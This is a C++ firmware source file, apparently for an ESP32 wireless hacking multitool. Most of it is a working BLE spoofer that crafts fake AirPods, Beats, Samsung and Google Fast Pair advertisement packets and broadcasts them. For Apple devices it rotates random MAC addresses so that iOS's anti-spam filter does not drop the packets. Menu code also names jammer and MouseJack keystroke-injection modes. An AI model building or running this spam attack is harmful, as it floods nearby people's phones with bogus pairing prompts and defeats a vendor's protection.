#include "SettingsStore.h"
#include "Touchscreen.h"
#include "config.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "icon.h"
#include "shared.h"
#include "utils.h"

#if defined(CONFIG_NIMBLE_CPP_IDF)
#include "host/ble_hs.h"
#else
#include "nimble/nimble/host/include/host/ble_hs.h"
#endif

#ifdef TFT_BLACK
#undef TFT_BLACK
#endif
#define TFT_BLACK FEATURE_BG

#ifndef FEATURE_TEXT
#define FEATURE_TEXT ORANGE
#endif
#ifndef FEATURE_WHITE
#define FEATURE_WHITE 0xFFFF
#endif

#ifdef TFT_WHITE
#undef TFT_WHITE
#endif
#define TFT_WHITE FEATURE_TEXT

#ifdef WHITE
#undef WHITE
#endif
#define WHITE FEATURE_WHITE

#ifdef DARK_GRAY
#undef DARK_GRAY
#endif
#define DARK_GRAY UI_FG

static constexpr int kBleScreenH = 320;

static int bleContentBottom() {
  return featureHasTouchNavBar() ? touchNavContentBottomY() : kBleScreenH;
}

bool ensureBleStackReady() {
  static bool ready = false;
  if (ready) {
    return true;
  }
  const uint32_t heap = ESP.getFreeHeap();
  Serial.printf("[ble] init begin, free heap=%u\n", (unsigned)heap);
#if !BOARD_HAS_ESP32S3
  // Classic ESP32 NimBLE typically needs ~40KB+ free; abort soft instead of OOM reboot.
  if (heap < 40000u) {
    Serial.println("[ble] skip init — low heap");
    return false;
  }
#endif
  // Classic BT controller RAM is unused by NimBLE; reclaim it before stack init.
  // On ESP32 this often frees ~30KB and avoids boot OOM/reboot after the intro.
  esp_err_t rel = esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
  if (rel != ESP_OK && rel != ESP_ERR_INVALID_STATE) {
    Serial.printf("[ble] classic mem_release: %s\n", esp_err_to_name(rel));
  }
  BLEDevice::init(ESP32DIV_NAME);
  ready = true;
  Serial.printf("[ble] init done, free heap=%u\n", (unsigned)ESP.getFreeHeap());
  return true;
}

static bool bleRequireStackOrExit() {
  if (ensureBleStackReady()) {
    return true;
  }
  tft.fillScreen(TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(UI_WARN, TFT_BLACK);
  tft.setCursor(12, 120);
  tft.print("BLE: low memory");
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(12, 140);
  tft.print("Exit and try again");
  delay(1200);
  feature_exit_requested = true;
  return false;
}

static int bleMaxLinesInZone(int contentTop, int lineHeight) {
  const int h = bleContentBottom() - contentTop;
  if (h <= 0 || lineHeight <= 0) {
    return 1;
  }
  return h / lineHeight;
}

static void bleClearBody(uint16_t color = TFT_BLACK) {
  if (featureHasTouchNavBar()) {
    featureClearContent(color);
  } else {
    tft.fillScreen(color);
  }
}

// Remapped layout: LEFT is always Exit; SELECT always carries the screen's
// single most important action.
static void bleSetExitOnlyNavLabels() {
  setTouchNavLabels("Exit", nullptr, nullptr, nullptr, nullptr);
}

static void bleSetJammerNavLabels() {
  setTouchNavLabels("Exit", nullptr, "Toggle", nullptr, "Mode");
}

static void bleSetProkillNavLabels() {
  // Remapped layout: LEFT=Exit (was Mode-), SELECT=Toggle on/off (was UP --
  // the most important action), UP=Mode- (was LEFT; Prev/Next-style pairs
  // always sit on UP/DOWN), DOWN=Mode+ (was RIGHT).
  setTouchNavLabels("Exit", "Mode+", "Toggle", "Mode-", nullptr);
}

static void bleSetScannerNavLabels() {
  // Remapped layout: LEFT=Exit (was Cal), SELECT=Scan (the most important
  // action, was Exit), RIGHT=Cal (secondary, was LEFT).
  setTouchNavLabels("Exit", nullptr, "Scan", nullptr, "Cal");
}

static void bleSetEsbNavLabels() {
  // Remapped layout: LEFT=Exit (was Ch-), SELECT=Hop (toggle channel
  // hopping -- the most important action, was Hop on UP already but Exit
  // was on center), UP=Ch- (was LEFT), DOWN=Ch+ (was RIGHT; Ch-/Ch+ is a
  // Prev/Next-style pair, always on UP/DOWN), RIGHT=Log (secondary, was DOWN).
  setTouchNavLabels("Exit", "Ch+", "Hop", "Ch-", "Log");
}

static void bleSetEsbReplayNavLabels() {
  // Remapped layout: LEFT=Exit (was Prev), SELECT=Play (the most important
  // action, was on UP with Exit on center), UP=Prev (was LEFT), DOWN=Next
  // (was RIGHT; Prev/Next always sit on UP/DOWN), RIGHT=Arm/long-press
  // Clear (secondary, was DOWN).
  setTouchNavLabels("Exit", "Next", "Play", "Prev", "Arm");
}

static void bleSetMouseJackNavLabels() {
  // Remapped layout: LEFT=Exit (was Clear), SELECT=Pause (the most
  // important action, was on DOWN with Exit on center), RIGHT=Clear
  // (secondary, was LEFT).
  setTouchNavLabels("Exit", nullptr, "Pause", nullptr, "Clr");
}

static void bleSetMjInjectNavLabels() {
  // Remapped layout: LEFT=Exit (was Prev), SELECT=Fire (the most important
  // action, was on UP with Exit on center), UP=Prev (was LEFT), DOWN=Next
  // (was RIGHT; Prev/Next always sit on UP/DOWN), RIGHT=Pay (secondary,
  // was DOWN).
  setTouchNavLabels("Exit", "Next", "Fire", "Prev", "Pay");
}

static constexpr unsigned long kBleNavDebounceMs = 200;

static void bleWaitButtonRelease(int pin) {
  while (isButtonPressed(pin)) {
    delay(10);
  }
  delay(kBleNavDebounceMs);
}

static void bleWaitNavRelease(int pin1, int pin2 = -1, int pin3 = -1) {
  while (isButtonPressed(pin1) ||
         (pin2 >= 0 && isButtonPressed(pin2)) ||
         (pin3 >= 0 && isButtonPressed(pin3))) {
    delay(10);
  }
  delay(kBleNavDebounceMs);
}

namespace Scanner { void scannerHandleNavButtons(); }
namespace ProtoKill { void prokillHandleNavButtons(); }
namespace EsbSniffer { void esbHandleNavButtons(); }

static void bleSetSpooferNavLabels() {
  // Remapped layout: LEFT=Exit (was device type -), SELECT=Power
  // (toggle advertising -- the most important action, was UP), UP=device
  // type - / Prev (was LEFT), DOWN=device type + / Next (was RIGHT;
  // Prev/Next always sit on UP/DOWN), RIGHT=adv type (was DOWN).
  setTouchNavLabels("Exit", "Next", "Power", "Prev", "Type");
}

namespace BleSpoofer {

#define SCREEN_HEIGHT 250
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String spooferBuffer[MAX_LINES];
uint16_t colorspooferBuffer[MAX_LINES];
int spooferlineIndex = 0;

static bool uiDrawn = false;

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 5

static int iconX[ICON_NUM] = {90, 130, 170, 210, 10};
static int iconY = STATUS_BAR_Y_OFFSET;

BLEAdvertising *pAdvertising;
std::string devices_uuid = "00003082-0000-1000-9000-00805f9b34fb";

uint32_t delayMillisecond = 1000;
unsigned long lastDebounceTimeNext = 0;
unsigned long lastDebounceTimePrev = 0;
unsigned long lastDebounceTimeAdvNext = 0;
unsigned long lastDebounceTimeAdvPrev = 0;

int lastButtonStateNext = LOW;
int lastButtonStatePrev = LOW;
int lastButtonStateAdvNext = LOW;
int lastButtonStateAdvPrev = LOW;

unsigned long lastDebounceTime = 0;

bool isAdvertising = false;

int scanTime = 5;
int deviceType = 1;
int delaySeconds = 1;
// Default ADV_IND (connectable undirected). NimBLE only exposes
 // BLE_GAP_CONN_MODE_{NON,DIR,UND} — map UI labels onto those.
int advType = 1;
int attack_state = 1;
int device_choice = 0;
int device_index = 0;

static bool s_spooferAdvConfigured = false;
static unsigned long s_spooferLastBurstMs = 0;

// Apple Continuity Proximity Pair model IDs (Flipper / AppleJuice).
static const uint16_t kAppleModels[] = {
  0x0220, // AirPods
  0x0E20, // AirPods Pro
  0x0A20, // AirPods Max
  0x0F20, // AirPods Gen 2
  0x1320, // AirPods Gen 3
  0x1420, // AirPods Pro Gen 2
  0x0320, // PowerBeats
  0x0B20, // PowerBeats Pro
  0x0C20, // Beats Solo Pro
  0x1120, // Beats Studio Buds
  0x1020, // Beats Flex
  0x0520, // Beats X
  0x0620, // Beats Solo 3
  0x0920, // Beats Studio 3
  0x1720, // Beats Studio Pro
  0x1220, // Beats Fit Pro
  0x1620, // Beats Studio Buds+
};
static constexpr uint8_t kAppleModelCount =
  sizeof(kAppleModels) / sizeof(kAppleModels[0]);

// Samsung EasySetup Watch models (Flipper Xtreme).
struct WatchModel {
  uint8_t value;
  const char* name;
};
static const WatchModel samsungModels[] = {
  {0x04, "Galaxy Watch 4"},
  {0x11, "Galaxy Watch 5"},
  {0x1B, "Galaxy Watch 6"},
};
static constexpr uint8_t samsungModelCount =
  sizeof(samsungModels) / sizeof(samsungModels[0]);

// Samsung EasySetup Buds — full 31-byte AD (Flipper).
struct BudsModel {
  uint32_t value;
  const char* name;
};
static const BudsModel samsungBudsModels[] = {
  {0xEE7A0C, "Galaxy Buds"},
  {0x9D1700, "Galaxy Buds Dots"},
  {0xB8B905, "Galaxy Buds White"},
};
static constexpr uint8_t samsungBudsModelCount =
  sizeof(samsungBudsModels) / sizeof(samsungBudsModels[0]);

// Google Fast Pair Service (UUID 0xFE2C) — Flipper model IDs.
struct FastPairModel {
  uint32_t value;
  const char* name;
};
static const FastPairModel fastPairModels[] = {
  {0x00B727, "Google Smart Ctrl"},
  {0x92BBBD, "Pixel Buds"},
  {0x000006, "Pixel Buds A-Series"},
  {0xD446A7, "Sony XM5"},
  {0x2D7A23, "Sony WF-1000XM4"},
  {0x0000F0, "Bose QC35 II"},
  {0xCD8256, "Bose NC 700"},
  {0x821F66, "JBL Flip 6"},
  {0xF52494, "JBL Buds Pro"},
  {0x0582FD, "Pixel Buds Pro"},
};
static constexpr uint8_t fastPairModelCount =
  sizeof(fastPairModels) / sizeof(fastPairModels[0]);

// deviceType: 1..17 Apple, 18..20 Samsung Watch, 21..23 Samsung Buds,
 // 24..(24+fastPair-1) Google Fast Pair
static constexpr int kSpooferDeviceMax =
  17 + (int)samsungModelCount + (int)samsungBudsModelCount + (int)fastPairModelCount;

static void buildAppleProximityPacket(uint8_t* out, uint16_t model) {
  // Apple Continuity "Proximity Pairing" frame, exactly 31 bytes (BLE max).
  //
  // Layout:
  //   [0..2]   Flags AD: 02 01 1A (LE General Discoverable + BR/EDR not
  //            supported) — iOS requires a public ADV_IND with flags.
  //   [3]      Manufacturer AD length = 27 (0x1B)
  //   [4]      AD type = 0xFF (Manufacturer Specific Data)
  //   [5..6]   Apple company ID = 4C 00 (little-endian)
  //   [7]      Continuity sub-type = 0x07 (Proximity Pairing)
  //   [8]      Continuity payload length = 22 (0x16)
  //   [9]      status byte = 0x07
  //   [10..11] product model ID (varies per AirPods/Beats model)
  //   [12..30] fixed continuity signature + padding
  //
  // Only the two-byte model identifier varies between AirPods/Beats products.
  static const uint8_t kTemplate[31] = {
    0x02, 0x01, 0x1A,                                 // Flags AD
    0x1B, 0xFF, 0x4C, 0x00,                           // Manufacturer AD header
    0x07, 0x16,                                       // sub-type + payload len
    0x07,                                             // status
    0x00, 0x00,                                       // model (overwritten below)
    0x75, 0xAA, 0x30, 0x01, 0x00, 0x00,               // fixed continuity sig
    0x45, 0x12, 0x12, 0x12,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // padding
  };
  memcpy(out, kTemplate, sizeof(kTemplate));
  out[10] = (uint8_t)((model >> 8) & 0xFF);  // model high byte
  out[11] = (uint8_t)(model & 0xFF);         // model low byte
}

static bool generateSamsungWatchPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
  if (modelIndex >= samsungModelCount) return false;
  uint8_t raw[15] = {
    14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
  };
  raw[14] = samsungModels[modelIndex].value;
  advData.addData(std::string((char*)raw, sizeof(raw)));
  return true;
}

static bool generateSamsungBudsPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
  if (modelIndex >= samsungBudsModelCount) return false;
  const uint32_t model = samsungBudsModels[modelIndex].value;
  uint8_t raw[31] = {};
  int i = 0;
  raw[i++] = 27;
  raw[i++] = 0xFF;
  raw[i++] = 0x75;
  raw[i++] = 0x00;
  raw[i++] = 0x42;
  raw[i++] = 0x09;
  raw[i++] = 0x81;
  raw[i++] = 0x02;
  raw[i++] = 0x14;
  raw[i++] = 0x15;
  raw[i++] = 0x03;
  raw[i++] = 0x21;
  raw[i++] = 0x01;
  raw[i++] = 0x09;
  raw[i++] = (uint8_t)((model >> 16) & 0xFF);
  raw[i++] = (uint8_t)((model >> 8) & 0xFF);
  raw[i++] = 0x01;
  raw[i++] = (uint8_t)(model & 0xFF);
  raw[i++] = 0x06;
  raw[i++] = 0x3C;
  raw[i++] = 0x94;
  raw[i++] = 0x8E;
  raw[i++] = 0x00;
  raw[i++] = 0x00;
  raw[i++] = 0x00;
  raw[i++] = 0x00;
  raw[i++] = 0xC7;
  raw[i++] = 0x00;
  raw[i++] = 16;
  raw[i++] = 0xFF;
  raw[i++] = 0x75;
  advData.addData(std::string((char*)raw, 31));
  return true;
}

static bool generateGoogleAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
  if (modelIndex >= fastPairModelCount) return false;
  const uint32_t model = fastPairModels[modelIndex].value;
  uint8_t raw[14];
  int i = 0;
  raw[i++] = 3;
  raw[i++] = 0x03;  // Complete 16-bit Service UUID list
  raw[i++] = 0x2C;
  raw[i++] = 0xFE;  // Fast Pair 0xFE2C
  raw[i++] = 6;
  raw[i++] = 0x16;  // Service Data
  raw[i++] = 0x2C;
  raw[i++] = 0xFE;
  raw[i++] = (uint8_t)((model >> 16) & 0xFF);
  raw[i++] = (uint8_t)((model >> 8) & 0xFF);
  raw[i++] = (uint8_t)(model & 0xFF);
  raw[i++] = 2;
  raw[i++] = 0x0A;  // Tx Power
  raw[i++] = (uint8_t)(random(121) - 100);
  advData.addData(std::string((char*)raw, sizeof(raw)));
  return true;
}

static BLEAdvertisementData getAdvertismentData() {
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  if (device_choice == 0) {  // Apple Continuity
    uint8_t packet[31];
    const uint16_t model =
      kAppleModels[device_index % kAppleModelCount];
    buildAppleProximityPacket(packet, model);
    oAdvertisementData.addData(std::string((char*)packet, 31));
  } else if (device_choice == 1) {  // Samsung Watch
    generateSamsungWatchPacket((uint8_t)device_index, oAdvertisementData);
  } else if (device_choice == 2) {  // Google Fast Pair
    generateGoogleAdvPacket((uint8_t)device_index, oAdvertisementData);
  } else if (device_choice == 3) {  // Samsung Buds
    generateSamsungBudsPacket((uint8_t)device_index, oAdvertisementData);
  }

  return oAdvertisementData;
}

static uint8_t spooferNimbleAdvMode(int type) {
  // NimBLE uses connection modes rather than Bluedroid ADV_TYPE_* values.
  switch (type) {
    case 2:
    case 5:
      return BLE_GAP_CONN_MODE_DIR;
    case 3:
    case 4:
      return BLE_GAP_CONN_MODE_NON;
    case 1:
    default:
      return BLE_GAP_CONN_MODE_UND; // ADV_IND
  }
}

// One-time switch from the default public address to a random address type.
// On ESP32-S3 the NimBLE host has no RPA privacy timer (host-based privacy is
// compiled out), so nothing will overwrite the static address set below.
// Done lazily on the first Apple rotation.
static bool s_spooferMacRandomized = false;

// Generate a fresh random-static BLE address and install it on the NimBLE
// stack. MUST be called while advertising is stopped (see spooferBurstOnce):
// the underlying "LE Set Random Address" HCI command is rejected while the
// radio is actively transmitting, which was the cause of the S3 lockups.
static void spooferRotateMac() {
  if (!s_spooferMacRandomized) {
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    s_spooferMacRandomized = true;
  }

  // ble_hs_id_set_rnd() takes the address in NimBLE native (little-endian)
  // order: index 5 is the most-significant byte. A random-static address has
  // its two most-significant bits set to 11.
  uint8_t mac[6];
  int rc;
  do {
    esp_fill_random(mac, sizeof(mac));
    mac[5] |= 0xC0;   // random-static address (bits 7-6 of MSB = 11)
    mac[0] &= 0xFE;   // unicast (clear multicast bit in the LSB)
    rc = ble_hs_id_set_rnd(mac);
  } while (rc != 0);
}

static void spooferBurstOnce() {
  if (!pAdvertising) return;

  // Always stop first so the radio is never transmitting while we change
  // address/data — the safe rotation order that avoids S3 lockups.
  pAdvertising->stop();

  BLEAdvertisementData oAdvertisementData = getAdvertismentData();

  // NOTE: do NOT use setFlags()/addServiceUUID()/addTxPower() — they prepend
  // their own AD structures and corrupt the exact 31-byte Apple frame.
  // getAdvertismentData() injects the raw payload via addData(), which
  // becomes ble_gap_adv_set_data() byte-for-byte.
  pAdvertising->setAdvertisementData(oAdvertisementData);
  pAdvertising->setMinInterval(0x20);
  pAdvertising->setMaxInterval(0x20);
  pAdvertising->setMinPreferred(0x20);
  pAdvertising->setMaxPreferred(0x20);

  // Apple Continuity (AirPods) proximity pairing is only carried by ADV_IND
  // (connectable undirected). Directed advertising (ADV_DIRECT_IND) carries
  // NO advertising payload at all, so the Apple packet would never be sent.
  // Force BLE_GAP_CONN_MODE_UND for Apple regardless of the UI "Type" pick.
  uint8_t mode;
  if (device_choice == 0) {
    mode = BLE_GAP_CONN_MODE_UND; // ADV_IND
  } else {
    mode = spooferNimbleAdvMode(advType);
  }
  pAdvertising->setAdvertisementType(mode);

  // Apple Continuity: rotate the MAC (stop -> new random-static -> start).
  // iOS drops repeated advertisements from a static MAC (anti-spam filter).
  if (device_choice == 0) {
    spooferRotateMac();
  }

  // --- Serial diagnostics BEFORE start(): current MAC + exact payload bytes.
  // Lets us audit that NimBLE preserved the 31-byte packet byte-for-byte.
  const std::string payload = oAdvertisementData.getPayload();
  Serial.printf("[spoofer] MAC=%s payload(%u)=",
                NimBLEDevice::getAddress().toString().c_str(),
                (unsigned)payload.length());
  for (size_t i = 0; i < payload.length(); i++) {
    Serial.printf("%02X", (uint8_t)payload[i]);
  }
  Serial.println();

  bool started;
  if (mode == BLE_GAP_CONN_MODE_DIR) {
    // Directed advertising needs a target address (random static).
    uint8_t target[6];
    esp_fill_random(target, sizeof(target));
    target[5] |= 0xC0;
    NimBLEAddress directedTarget(target, BLE_ADDR_RANDOM);
    started = pAdvertising->start(0, nullptr, &directedTarget);
  } else {
    started = pAdvertising->start();
  }
  s_spooferLastBurstMs = millis();

  Serial.printf("[spoofer] start()=%d choice=%d index=%d mode=%u\n",
                (int)started, device_choice, device_index, (unsigned)mode);
}

static constexpr int SPOOFER_LOG_TOP = 45;

static int spooferPanelTop() {
  const int panelH = featureHasTouchNavBar() ? 27 : 50;
  return bleContentBottom() - panelH;
}

static int spooferLogBottom() {
  return spooferPanelTop();
}

static int spooferVisibleLines() {
  const int h = spooferLogBottom() - SPOOFER_LOG_TOP;
  if (h <= 0) {
    return 1;
  }
  return h / LINE_HEIGHT;
}

static bool spooferLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= spooferLogBottom();
}

void Printspoofer(String text, uint16_t color, bool extraSpace = false) {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  const int visibleLines = spooferVisibleLines();
  if (spooferlineIndex >= visibleLines) {
    for (int i = 0; i < visibleLines - 1; i++) {
      spooferBuffer[i] = spooferBuffer[i + 1];
      colorspooferBuffer[i] = colorspooferBuffer[i + 1];
    }
    spooferlineIndex = visibleLines - 1;
  }

  spooferBuffer[spooferlineIndex] = text;
  colorspooferBuffer[spooferlineIndex] = color;
  spooferlineIndex++;

  if (extraSpace && spooferlineIndex < visibleLines) {
    spooferBuffer[spooferlineIndex] = "";
    colorspooferBuffer[spooferlineIndex] = TFT_WHITE;
    spooferlineIndex++;
  }

  for (int i = 0; i < spooferlineIndex && i < visibleLines; i++) {
    int yPos = i * LINE_HEIGHT + SPOOFER_LOG_TOP;
    if (!spooferLineFits(yPos)) {
      continue;
    }

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(colorspooferBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(spooferBuffer[i]);
  }
}

void sppferLoadingBar(int step) {
  int totalSteps = 4;
  int filledBlocks = (step * 20) / totalSteps;

  String bar = "[";
  for (int i = 0; i < 20; i++) {
    bar += (i < filledBlocks) ? "#" : "_";
  }
  bar += "]";

  Printspoofer(bar, TFT_GREEN);
}

static int s_spooferPanelLastTop = -1;
static int s_spooferPanelLastH = -1;
static int s_lastSpooferDevice = -1;
static int s_lastSpooferAdv = -1;
static bool s_spooferChromeReady = false;

static constexpr int SPOOFER_VALUE_X = 58;
static constexpr int SPOOFER_VALUE_W = 178;

static void spooferResetPanelCache() {
  s_spooferChromeReady = false;
  s_lastSpooferDevice = -1;
  s_lastSpooferAdv = -1;
  s_spooferPanelLastTop = -1;
  s_spooferPanelLastH = -1;
}

static const char* spooferDeviceLabel(int type) {
  switch (type) {
    case 1: return "Airpods";
    case 2: return "Airpods Pro";
    case 3: return "Airpods Max";
    case 4: return "Airpods Gen 2";
    case 5: return "Airpods Gen 3";
    case 6: return "Airpods Pro Gen 2";
    case 7: return "PowerBeats";
    case 8: return "PowerBeats Pro";
    case 9: return "Beats Solo Pro";
    case 10: return "Beats Buds";
    case 11: return "Beats Flex";
    case 12: return "BeatsX";
    case 13: return "Beats Solo3";
    case 14: return "Beats Studio3";
    case 15: return "Beats StudioPro";
    case 16: return "Beats FitPro";
    case 17: return "Beats BudsPlus";
    case 18: return samsungModels[0].name;
    case 19: return samsungModels[1].name;
    case 20: return samsungModels[2].name;
    case 21: return samsungBudsModels[0].name;
    case 22: return samsungBudsModels[1].name;
    case 23: return samsungBudsModels[2].name;
    default: {
      const int fp = type - 24;
      if (fp >= 0 && fp < (int)fastPairModelCount) {
        return fastPairModels[fp].name;
      }
      return "Airpods";
    }
  }
}

static const char* spooferAdvLabel(int type) {
  switch (type) {
    case 1: return "IND";
    case 2: return "DIRECT HIGH";
    case 3: return "SCAN";
    case 4: return "NONCONN";
    case 5: return "DIRECT LOW";
    default: return "IND";
  }
}

static String spooferFitText(const char* text, int maxWidth) {
  String out = text;
  tft.setTextSize(1);
  if (tft.textWidth(out) <= maxWidth) {
    return out;
  }
  while (out.length() > 1 && tft.textWidth(out + "...") > maxWidth) {
    out.remove(out.length() - 1);
  }
  if (!out.isEmpty()) {
    out += "...";
  }
  return out;
}

static void spooferDrawValueWell(int y, int h, const char* text) {
  tft.fillRect(SPOOFER_VALUE_X, y, SPOOFER_VALUE_W, h, DARK_GRAY);
  tft.drawRect(SPOOFER_VALUE_X, y, SPOOFER_VALUE_W, h, DARK_GRAY);

  const String fitted = spooferFitText(text, SPOOFER_VALUE_W - 8);
  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, DARK_GRAY);
  tft.setCursor(SPOOFER_VALUE_X + 4, y + ((h - 8) / 2));
  tft.print(fitted);
}

static void spooferLayoutRows(int panelTop, int panelH, int& row1Y, int& row2Y, int& rowH,
                              const char*& advCaption) {
  if (panelH >= 36) {
    rowH = 14;
    row1Y = panelTop + 3;
    row2Y = panelTop + 18;
    advCaption = "Adv Type:";
  } else {
    rowH = 10;
    row1Y = panelTop + 2;
    row2Y = panelTop + 13;
    advCaption = "Adv:";
  }
}

void updateSpoofer() {
  const int panelTop = spooferPanelTop();
  const int panelH = bleContentBottom() - panelTop;
  if (panelTop < 40 || panelH <= 0) {
    return;
  }

  int row1Y = 0;
  int row2Y = 0;
  int rowH = 0;
  const char* advCaption = "Adv Type:";
  spooferLayoutRows(panelTop, panelH, row1Y, row2Y, rowH, advCaption);

  const bool layoutChanged =
    (panelTop != s_spooferPanelLastTop || panelH != s_spooferPanelLastH);
  const bool needChrome = !s_spooferChromeReady || layoutChanged;
  const bool deviceChanged = (deviceType != s_lastSpooferDevice);
  const bool advChanged = (advType != s_lastSpooferAdv);

  if (!needChrome && !deviceChanged && !advChanged) {
    return;
  }

  if (needChrome) {
    tft.drawFastHLine(0, panelTop - 1, 240, UI_LINE);
    tft.fillRect(0, panelTop, 240, panelH, DARK_GRAY);

    tft.setTextSize(1);
    tft.setTextColor(TFT_WHITE, DARK_GRAY);
    tft.setCursor(5, row1Y + ((rowH - 8) / 2));
    tft.print("Device:");
    tft.setCursor(5, row2Y + ((rowH - 8) / 2));
    tft.print(advCaption);

    s_spooferChromeReady = true;
    s_spooferPanelLastTop = panelTop;
    s_spooferPanelLastH = panelH;
    s_lastSpooferDevice = -1;
    s_lastSpooferAdv = -1;
  }

  if (needChrome || deviceChanged) {
    spooferDrawValueWell(row1Y, rowH, spooferDeviceLabel(deviceType));
    s_lastSpooferDevice = deviceType;
  }

  if (needChrome || advChanged) {
    spooferDrawValueWell(row2Y, rowH, spooferAdvLabel(advType));
    s_lastSpooferAdv = advType;
  }
}

void Airpods() {
  device_choice = 0;
  device_index = 0;
  attack_state = 1;
}

void Airpods_pro() {
  device_choice = 0;
  device_index = 1;
  attack_state = 1;
}

void Airpods_Max() {
  device_choice = 0;
  device_index = 2;
  attack_state = 1;
}

void Airpods_Gen_2() {
  device_choice = 0;
  device_index = 3;
  attack_state = 1;
}

void Airpods_Gen_3() {
  device_choice = 0;
  device_index = 4;
  attack_state = 1;
}

void Airpods_Pro_Gen_2() {
  device_choice = 0;
  device_index = 5;
  attack_state = 1;
}

void Power_Beats() {
  device_choice = 0;
  device_index = 6;
  attack_state = 1;
}

void Power_Beats_Pro() {
  device_choice = 0;
  device_index = 7;
  attack_state = 1;
}

void Beats_Solo_Pro() {
  device_choice = 0;
  device_index = 8;
  attack_state = 1;
}

void Beats_Studio_Buds() {
  device_choice = 0;
  device_index = 9;
  attack_state = 1;
}

void Beats_Flex() {
  device_choice = 0;
  device_index = 10;
  attack_state = 1;
}

void Beats_X() {
  device_choice = 0;
  device_index = 11;
  attack_state = 1;
}

void Beats_Solo_3() {
  device_choice = 0;
  device_index = 12;
  attack_state = 1;
}

void Beats_Studio_3() {
  device_choice = 0;
  device_index = 13;
  attack_state = 1;
}

void Beats_Studio_Pro() {
  device_choice = 0;
  device_index = 14;
  attack_state = 1;
}

void Betas_Fit_Pro() {
  device_choice = 0;
  device_index = 15;
  attack_state = 1;
}

void Beats_Studio_Buds_Plus() {
  device_choice = 0;
  device_index = 16;
  attack_state = 1;
}

// Android devices
void Galaxy_Watch_4() {
  device_choice = 1; // Samsung Watch
  device_index = 0;
  attack_state = 1;
}

void Galaxy_Watch_5() {
  device_choice = 1;
  device_index = 1;
  attack_state = 1;
}

void Galaxy_Watch_6() {
  device_choice = 1;
  device_index = 2;
  attack_state = 1;
}

void Galaxy_Buds(uint8_t idx) {
  device_choice = 3; // Samsung Buds EasySetup
  device_index = idx % samsungBudsModelCount;
  attack_state = 1;
}

void Google_Fast_Pair(uint8_t idx) {
  device_choice = 2; // Google Fast Pair
  device_index = idx % fastPairModelCount;
  attack_state = 1;
}

void setAdvertisingData() {
  if (deviceType >= 1 && deviceType <= 17) {
    device_choice = 0;
    device_index = deviceType - 1;
    attack_state = 1;
  } else if (deviceType >= 18 && deviceType <= 20) {
    device_choice = 1;
    device_index = deviceType - 18;
    attack_state = 1;
  } else if (deviceType >= 21 && deviceType <= 23) {
    Galaxy_Buds((uint8_t)(deviceType - 21));
  } else if (deviceType >= 24 && deviceType <= kSpooferDeviceMax) {
    Google_Fast_Pair((uint8_t)(deviceType - 24));
  } else {
    Airpods();
  }
}

void changeDeviceTypeNext() {
  deviceType++;
  if (deviceType > kSpooferDeviceMax) deviceType = 1;
  Serial.println("Device Type Next: " + String(deviceType));
  setAdvertisingData();
  if (isAdvertising && pAdvertising) {
    spooferBurstOnce();
  }
  updateSpoofer();
}

void changeDeviceTypePrev() {
  deviceType--;
  if (deviceType < 1) deviceType = kSpooferDeviceMax;
  Serial.println("Device Type Prev: " + String(deviceType));
  setAdvertisingData();
  if (isAdvertising && pAdvertising) {
    spooferBurstOnce();
  }
  updateSpoofer();
}

void changeAdvTypeNext() {
  advType++;
  if (advType > 5) advType = 1;
  Serial.println("Advertising Type Next: " + String(advType));
  setAdvertisingData();
  if (isAdvertising && pAdvertising) {
    spooferBurstOnce();
  }
  updateSpoofer();
}

void changeAdvTypePrev() {
  advType--;
  if (advType < 1) advType = 5;
  Serial.println("Advertising Type Prev: " + String(advType));
  setAdvertisingData();
  if (isAdvertising && pAdvertising) {
    spooferBurstOnce();
  }
  updateSpoofer();
}

void toggleAdvertising() {
  isAdvertising = !isAdvertising;

  if (!isAdvertising) {
    if (pAdvertising) {
      pAdvertising->stop();
    }
    s_spooferAdvConfigured = false;
    Serial.println("Advertising stopped.");
    Printspoofer("[!] Advertising stopped", TFT_YELLOW, true);
    updateSpoofer();
  } else {
    setAdvertisingData();
    if (attack_state == 1 && pAdvertising) {
      spooferBurstOnce();

      Printspoofer("[+] " + String(spooferDeviceLabel(deviceType)), TFT_WHITE, false);
      Printspoofer("[+] Adv: " + String(spooferAdvLabel(advType)), TFT_WHITE, false);
      Printspoofer("[!] Advertising started", TFT_YELLOW, false);
    }

    Serial.println("Advertising started.");
    updateSpoofer();
  }
}

void runUI() {

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_down_minus,
    bitmap_icon_sort_up_plus,
    bitmap_icon_key,
    bitmap_icon_power,
    bitmap_icon_go_back
  };

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  if (!uiDrawn) {

    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.fillRect(80, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
